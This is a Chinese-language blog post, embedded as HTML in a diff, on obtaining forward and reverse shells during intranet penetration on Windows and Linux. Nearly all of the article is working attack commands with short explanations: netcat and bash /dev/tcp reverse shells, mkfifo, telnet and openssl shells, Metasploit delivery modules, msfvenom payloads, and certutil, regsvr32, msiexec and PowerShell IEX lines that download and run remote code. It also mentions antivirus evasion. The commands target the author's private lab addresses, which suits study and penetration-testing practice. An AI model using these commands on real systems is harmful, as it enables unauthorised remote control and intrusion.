@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="反弹Shell正向shell 控制端主动发起连接请求去连接被控制端，中网网络链路不存在阻碍 适用场景：控制端与被控端之间是互通无阻的  阻碍的来源一方面是受害机如果在内网当中，没有独立的公网ip导致无法访问；另一方面正向从公网连接会受到防火墙安全策略的限制 正反shell的区分：   谁是主动方(正向是攻击机,反向是受害机) 受害机对哪种shell的监管检测更严格(正向) 受害机在内网中攻击机就无">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透——反弹Shell的各种姿势">
+<meta property="og:url" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/index.html">
+<meta property="og:site_name" content="RacerZ">
+<meta property="og:description" content="反弹Shell正向shell 控制端主动发起连接请求去连接被控制端，中网网络链路不存在阻碍 适用场景：控制端与被控端之间是互通无阻的  阻碍的来源一方面是受害机如果在内网当中，没有独立的公网ip导致无法访问；另一方面正向从公网连接会受到防火墙安全策略的限制 正反shell的区分：   谁是主动方(正向是攻击机,反向是受害机) 受害机对哪种shell的监管检测更严格(正向) 受害机在内网中攻击机就无">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230104110228474.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230104110515219.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230105234537555.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002437690.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002022492.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106003311845.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106003432530.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106121141463.png">
+<meta property="article:published_time" content="2023-01-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-01-06T08:19:56.625Z">
+<meta property="article:author" content="RacerZ">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230104110228474.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网渗透——反弹Shell的各种姿势</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2077/07/07/TO-DO/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/01/05/Hibernate%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&text=内网渗透——反弹Shell的各种姿势"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&is_video=false&description=内网渗透——反弹Shell的各种姿势"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透——反弹Shell的各种姿势&body=Check out this article: https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&name=内网渗透——反弹Shell的各种姿势&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&t=内网渗透——反弹Shell的各种姿势"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">1.</span> <span class="toc-text">反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-number">1.1.</span> <span class="toc-text">正向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91Shell"><span class="toc-number">1.2.</span> <span class="toc-text">反向Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">1.3.</span> <span class="toc-text">Windows 反弹 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.4.</span> <span class="toc-text">Linux 反弹 shell</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网渗透——反弹Shell的各种姿势
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">RacerZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-05T16:00:00.000Z" itemprop="datePublished">2023-01-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><ul>
+<li><p>控制端主动发起连接请求去连接被控制端，中网网络链路不存在阻碍</p>
+<p>适用场景：控制端与被控端之间是互通无阻的</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230104110228474.png" alt="image-20230104110228474"></p>
+<p>阻碍的来源一方面是受害机如果在内网当中，没有独立的公网ip导致无法访问；另一方面正向从公网连接会受到防火墙安全策略的限制</p>
+<p>正反shell的区分：</p>
+<blockquote>
+<ol>
+<li>谁是主动方(正向是攻击机,反向是受害机)</li>
+<li>受害机对哪种shell的监管检测更严格(正向)</li>
+<li>受害机在内网中攻击机就无法通过指定ip和端口正向申请shell</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h4 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h4><ul>
+<li><p>被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230104110515219.png" alt="image-20230104110515219"></p>
+</li>
+</ul>
+<h4 id="Windows-反弹-Shell"><a href="#Windows-反弹-Shell" class="headerlink" title="Windows 反弹 Shell"></a>Windows 反弹 Shell</h4><ul>
+<li><p><code>nc.exe</code></p>
+<ol>
+<li><p>正向Shell</p>
+<p>被控端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e cmd.exe     // -e shell环境重定向至6666端口</span><br></pre></td></tr></table></figure>
+
+<p>控制端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.62 6666</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<p>被控端将cmd.exe重定向到本地的6666端口, 控制端主动连接受害机的6666端口, 即可获得shell</p>
+</li>
+<li><p>反向shell</p>
+<p>控制端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+
+<p>被控端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd.exe 192.168.1.227 6666</span><br></pre></td></tr></table></figure>
+
+<p>被控端将cmd.exe重定向到控制单的6666端口，控制单只需要监听本地的6666端口，即可获得shell</p>
+</li>
+</ol>
+</li>
+<li><p><code>Rundll32.exe</code> 与Windows操作系统相关</p>
+<p>它允许调用从DLL导出的函数（16位或32位），并将其存储在适当的内存库中</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32">https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32</a></p>
+<p>通过Metasploit的SMB Delivery模块发起Rundll32攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">set srvhost  msf服务ip</span><br><span class="line">set lhost smf服务ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploite -j</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230105234537555.png" alt="image-20230105234537555"></p>
+<p>执行payload之后将下列payload在目标机中执行，这个攻击依赖于SMB服务，需要目标机开启才行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe \\<span class="number">172</span>.<span class="number">16</span>.<span class="number">80</span>.<span class="number">136</span>\AeEcdf\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>我这儿不知道为啥一直显示无法加载指定模块</p>
+</li>
+<li><p><code>Regsvr32.exe</code></p>
+<p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。</p>
+<p>Regsvr32.exe安装在Windows XP和Windows后续版本的 <code>%systemroot%\System32</code>文件夹中</p>
+<p>语法: Regsvr32.exe [/s] [/u] [/n] [/i[:cmdline]]</p>
+<p>/u - 注销服务器</p>
+<p>/i - 调用DllInstall传递一个可选的[cmdline]; 当它与/u一起使用是, 它调用dll来写在</p>
+<p>/n - 不要调用DLLRegisterServer; 此选项必须与/i一起使用</p>
+<p>/s - 沉默; 不显示消息框</p>
+<p>通过msf的<code>web delivery</code>模块启动Regsvr32</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set srvhost msfip</span><br><span class="line">set lhost msfip</span><br><span class="line">set lport 6666</span><br><span class="line">set paylaod windows/meterpreter/reverse_tcp</span><br><span class="line">set target Regsvr32</span><br></pre></td></tr></table></figure>
+
+<p>该模块默认为python编写的exp，我们要改为想要执行的对应脚本语言写的payload</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002437690.png" alt="image-20230106002437690"></p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002022492.png" alt="image-20230106002022492"></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://172.16.80.136:8080/ExPIVc.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>Certuil.exe</code></p>
+<p><code>Certuil.exe</code>是作为证书服务的一部分安装的命令行程序, 我们可以用这个工具在计算机中执行恶意的exe文件以获得meterpreter会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.80.136 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -splite -f http://172.16.80.136/shell.exe shell.exe &amp; shell.exe</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -splite -f http://172.16.80.136:8000/shell.exe shell.exe delete</span><br></pre></td></tr></table></figure>
+
+<p>这里的利用就是通过certutil.exe下载指定ip中的恶意shell文件并执行，执行完后清除</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106003311845.png" alt="image-20230106003311845"></p>
+</li>
+</ul>
+<p>这台xp虚拟机太老，装软件服务也卡。。。下次还是得上靶机</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106003432530.png" alt="image-20230106003432530"></p>
+<ul>
+<li><p><code>Powershell.exe</code></p>
+<p>通过PowerShell发动Powercat攻击</p>
+<p>这个PoweCat需要有免杀能力</p>
+<p>攻击方先下载并启动一个服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:/github.com/besimorhino/powercat.git</span><br><span class="line"> </span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>之后监听端口等待接收反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.92.128:8000/powercat.ps1&#x27;);powercat -c 192.168.92.128 -p 6666 -e cmd&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>Msiexec.exe</code></p>
+<p>Windows OS 安装有一个Windows安装引擎，MSI包使用msiexe.exe来解释安装</p>
+<p>首先使用msf生成恶意的msi文件，并放到服务器上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.92.128 lport=6666 -f msi &gt; shell.msi</span><br><span class="line"> </span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>接着受害机执行msiexe下载指定恶意文件，触发反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /q /i http://ip/shell.msi</span><br></pre></td></tr></table></figure></li>
+<li><p><code>Metasploit.exe</code></p>
+<p>依然是通过msf生成一个恶意exe</p>
+<p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106121141463.png" alt="image-20230106121141463"></p>
+<p>参数总结：</p>
+<p><code>-p</code> Payload to use. Specify ‘-‘ or STDIN for custom</p>
+<p><code>LHOST</code> 接收反弹shell的ip</p>
+<p><code>LPORT</code> 接收反弹shell的端口</p>
+<p><code>-f</code> Output format</p>
+</li>
+</ul>
+<h4 id="Linux-反弹-shell"><a href="#Linux-反弹-shell" class="headerlink" title="Linux 反弹 shell"></a>Linux 反弹 shell</h4><ul>
+<li><p><strong>NC正向Shell</strong></p>
+<p>与Windows是一样的，不同点就是shell执行环境这里是bash</p>
+<p>通常情况下被控端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>控制端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 6666</span><br></pre></td></tr></table></figure>
+
+<p>但是在某些版本的nc处于安全考虑是没有-e参数的，这种情况下如何利用呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.92.128 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 原理：mkfifo命令首先创建了一个管道，cat将管道里面的内容输出传递给/bin/sh，-i创建一个shell环境，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc传到该管道，由此形成了一个回路</p>
+<p>/tmp/f 管道 =&gt; sh =&gt; nc =&gt; /tmp/f</p>
+</blockquote>
+<p>另一种方式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p>mknod 创建字符设备文件和块设备文件</p>
+<p>backpipe将其中的输入重定向到nc的标准输入当中，并将结果输出通过管道传给bash环境并执行，标准输出和错误输出结果再回传给backpipe</p>
+</li>
+<li><p><strong>Bash</strong></p>
+<p>被控端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<blockquote>
+<p>首先<code>bash -i &gt; /dev/tcp/ip/port</code>将被控端交互式shell的输出结果重定向到控制端，接着控制端<code>bash -i &lt; /deb/tcp/ip/port</code> 将控制端的输出重定向到被控端的bash环境中执行。最后将其整合在一起，我们需要的是被控端的bash执行，控制端能输入和显示输出</p>
+</blockquote>
+<p>不适用bash的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> exec 5&lt;&gt;/dev/tcp/ip/6666,cat&lt;&amp;5 | while read line; do $line 2&gt;&amp;5&gt;&amp;5;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;&gt;</code>表示可读可写，这里也就是先建立一个tcp通过并重定向至5，将5中的内容输出给while循环，循环依次接收数据并执行，最终再将输出重定向回tcp通道</p>
+</li>
+<li><p><code>Telnet</code></p>
+<p>攻击机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+
+<p>目标机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f a &amp;&amp; mknod a p &amp;&amp; telnet ip 6666 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line"> rm -f a;mknod a p;telnet 192.168.92.128 6666 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure></li>
+<li><p><code>Openssl</code></p>
+<p>openssl反弹443端口，厂商一般都有流量监控设备，直接明文传输会被审查到</p>
+<ol>
+<li><p>在靶机上生成密钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
+<li><p>在远程攻击机上启动监视器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</span><br></pre></td></tr></table></figure></li>
+<li><p>在目标机上反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s;/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 |openssl s_client -quiet -connect ip:6666 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">1.</span> <span class="toc-text">反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-number">1.1.</span> <span class="toc-text">正向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91Shell"><span class="toc-number">1.2.</span> <span class="toc-text">反向Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">1.3.</span> <span class="toc-text">Windows 反弹 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.4.</span> <span class="toc-text">Linux 反弹 shell</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&text=内网渗透——反弹Shell的各种姿势"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&is_video=false&description=内网渗透——反弹Shell的各种姿势"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透——反弹Shell的各种姿势&body=Check out this article: https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&title=内网渗透——反弹Shell的各种姿势"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&name=内网渗透——反弹Shell的各种姿势&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/&t=内网渗透——反弹Shell的各种姿势"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
